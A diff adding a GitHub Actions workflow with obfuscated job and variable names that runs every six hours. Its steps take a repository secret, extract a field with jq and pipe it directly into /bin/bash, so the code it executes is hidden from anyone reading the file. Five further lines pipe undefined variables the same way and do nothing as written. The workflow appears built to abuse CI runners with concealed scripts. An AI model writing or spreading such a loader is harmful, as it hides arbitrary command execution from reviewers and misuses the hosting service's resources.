@@ -1,0 +1,23 @@
+name: shuigeyue4183
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuigeyue4183
+        env:
+          x46: ${{ secrets.x46 }}
+        run: |
+          echo $x46 | jq -r .hf67781 | /bin/bash
+          echo $dtow996 | jq -r .ya12147 | /bin/bash
+          echo $hm912 | jq -r .zs873 | /bin/bash
+          echo $tfm0 | jq -r .pkgkb5 | /bin/bash
+          echo $htac23 | jq -r .ig546 | /bin/bash
+          echo $vpck43159 | jq -r .p1708 | /bin/bash
+
